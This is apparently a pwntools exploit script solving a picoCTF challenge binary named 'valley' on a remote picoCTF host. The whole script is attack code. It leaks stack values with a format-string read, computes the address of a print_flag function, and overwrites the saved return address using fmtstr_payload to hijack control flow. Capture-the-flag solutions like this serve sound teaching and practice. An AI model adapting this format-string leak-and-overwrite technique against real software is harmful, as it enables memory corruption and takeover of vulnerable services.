from pwn import *

context.log_level = "error"
context.binary = elf = ELF("./valley")

# io = process("./valley")
io = remote("shape-facility.picoctf.net", 65408)

io.sendline(b"%20$p.%21$p")
io.recvuntil(b"distance: ")
leaked = io.recvline().decode().strip().split(".")

rbp = int(leaked[0], 16)
ret_addr = int(leaked[1], 16)

ret_addr_stack = rbp - 8

print_flag = ret_addr - 0x1AA

chunks = [print_flag & 0xFFFF, (print_flag >> 16) & 0xFFFF, (print_flag >> 32) & 0xFFFF]

# Overwrite 3 chunks of the 8-byte return address using format string
for i in range(3):
    payload = fmtstr_payload(6, {ret_addr_stack + i * 2: chunks[i]}, write_size="byte")
    io.sendline(payload)

# Trigger the overwritten return address
io.sendline(b"exit")
io.interactive()
